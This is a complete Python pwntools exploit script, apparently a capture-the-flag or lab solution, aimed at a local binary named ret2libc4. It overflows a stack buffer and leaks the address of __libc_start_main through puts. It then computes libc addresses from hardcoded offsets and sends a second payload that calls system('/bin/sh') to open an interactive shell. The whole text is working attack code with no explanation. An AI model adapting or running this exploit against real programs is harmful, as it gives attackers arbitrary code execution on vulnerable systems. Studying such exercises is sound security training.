#!/usr/bin/env python
from pwn import *
offset___libc_start_main = 0x0001aa50
offset_system = 0x0003ea00
offset_str_bin_sh = 0x17ead1
sh = process('./ret2libc4')

ret2libc3 = ELF('./ret2libc4')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
print(hex(libc_start_main_addr))

libcbase = libc_start_main_addr - offset___libc_start_main
system_addr = libcbase + offset_system
binsh_addr = libcbase + offset_str_bin_sh

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()

